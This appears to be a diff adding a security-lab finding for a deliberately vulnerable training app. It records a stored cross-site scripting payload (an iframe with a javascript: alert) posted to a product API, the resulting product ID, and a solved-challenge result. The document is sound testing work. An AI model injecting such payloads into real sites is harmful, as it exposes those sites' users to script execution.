@@ -1,0 +1,20 @@
+Finding: JUICE-004
+Vulnerability: Stored Cross-Site Scripting
+Endpoint: POST /api/Products
+
+Payload:
+<iframe src="javascript:alert(`xss`)">
+
+Test Product:
+Stored XSS Lab Test
+
+Created Product ID:
+47
+
+Observed Result:
+HTTP 201 Created.
+Payload persisted in product description.
+API-only XSS challenge marked solved.
+
+Note:
+Execution on a later page load has not yet been independently verified.
